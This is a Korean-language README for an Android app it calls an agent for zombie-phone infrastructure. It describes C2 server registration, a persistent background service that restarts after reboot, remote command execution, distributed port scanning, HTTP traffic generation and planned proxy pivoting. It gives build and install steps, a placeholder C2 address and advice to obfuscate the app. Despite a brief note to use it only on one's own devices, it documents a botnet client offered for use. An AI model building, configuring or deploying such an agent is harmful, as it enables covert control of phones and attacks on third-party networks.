# Android Agent

좀비폰 인프라용 안드로이드 에이전트 앱

## 기능

- ✅ C2 서버 자동 등록
- ✅ WebSocket 실시간 통신
- ✅ 백그라운드 서비스 (재부팅 후 자동 시작)
- ✅ 분산 포트 스캔
- ✅ HTTP 트래픽 생성
- ✅ 명령 실행
- ✅ 프록시/피버팅 (개발 중)

## 빌드 방법

### Android Studio 사용

1. Android Studio로 `android-agent` 폴더 열기
2. Gradle 동기화
3. C2 서버 URL 수정:
   - `C2Client.kt` 파일에서 `baseUrl` 변경
   - 예: `http://your-ec2-ip:8000`
4. 빌드 및 설치

### 명령줄 빌드

```bash
cd android-agent
./gradlew assembleDebug

# APK 설치
adb install app/build/outputs/apk/debug/app-debug.apk
```

## 설정

### C2 서버 URL 변경

`app/src/main/java/com/redchain/agent/network/C2Client.kt`:

```kotlin
private val baseUrl = "http://YOUR_C2_SERVER_IP:8000"
```

### 권한

앱이 요청하는 권한:
- 인터넷 접근
- 네트워크 상태
- 백그라운드 실행
- Wake Lock (화면 꺼져도 실행)

## 사용법

1. 앱 설치 및 실행
2. "Start Service" 버튼 클릭
3. 앱이 자동으로 C2 서버에 등록
4. 백그라운드에서 작업 수행

## 보안 주의사항

- 본인 소유의 디바이스에서만 사용
- 프로덕션에서는 HTTPS 사용 필수
- API Key를 안전하게 저장
- ProGuard/R8로 난독화 권장

## 개발 TODO

- [ ] 네트워크 스캔 개선
- [ ] SOCKS5 프록시 구현
- [ ] 로컬 네트워크 발견
- [ ] 피버팅 터널링
- [ ] 암호화 통신 강화
